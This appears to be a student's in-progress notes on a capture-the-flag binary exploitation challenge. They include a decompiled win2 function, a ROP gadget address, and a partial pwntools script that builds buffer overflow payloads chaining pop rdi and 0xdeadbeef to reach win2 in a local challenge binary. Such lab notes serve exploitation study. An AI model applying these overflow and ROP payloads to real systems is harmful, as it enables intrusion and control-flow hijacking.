Answers: 
2,1,4 

found the offset for the first one by trial and error


found the localtion of the variable a1 using ida 
first attempt was to change the value of this, but it only resulted in sigsev

find rop gadget of the rdi register

address of rdi gadget: `0x00000000004017d6`

Here's the decompilation of the `win2` function. 

```c
__int64 __fastcall win2(int a1)
{
  char v2[8]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v3; // [rsp+18h] [rbp-28h]
  char s[13]; // [rsp+2Ah] [rbp-16h] BYREF
  char v5; // [rsp+37h] [rbp-9h]
  FILE *stream; // [rsp+38h] [rbp-8h]

  if ( a1 != -559038737 )
  {
    puts("You have failed to bring the artifact to the this temple. Return and try again");
    exit(1);
  }
  sprintf(s, "%X.txt", -559038737);

```



Script up till now: 

```python
from pwn import * 


elf = ELF('./chall')
#p = remote('localhost', 6161)
p = process('./chall')
#p = remote('iqtest.nitephase.live', 51823)
#offsets = [16, 24, 32, 40, 48, 56, 72, 80, 88, 96]

#offset = offsets[1]

a1_addr = 0x4024a7
addr_win2 = 0x401314
pop_rdi_rop = 0x00000000004017d6
offset = 16
payload1 = b'A'*(152) + p64(0x401401)

payload2 = b'B'*(offset) + p64(pop_rdi_rop) + p64(0xdeadbeef) + p64(addr_win2)


p.sendlineafter(b'>', b'2')

p.sendlineafter(b'>', b'1')
p.sendlineafter(b'>', b'4')

print(p.recvuntil(b'address: 0x401401'))
p.sendline(payload1)

print(p.recvuntil(b'Continue: \n'))

#p.sendline(b'a\n')
#p.wait()
#print(p.recvline())
p.interactive()
```


The second part is similar to `buffer_overflow2`


Notes: 

```python
payload = ""
with open("payload", "wb") as filp:
	filp.write(payload)

p = process("./chall")
g = pwn.gdb.attach(
	p, 
	gdbscript="""
	b *win2
	r < payload  
	"""

)

```
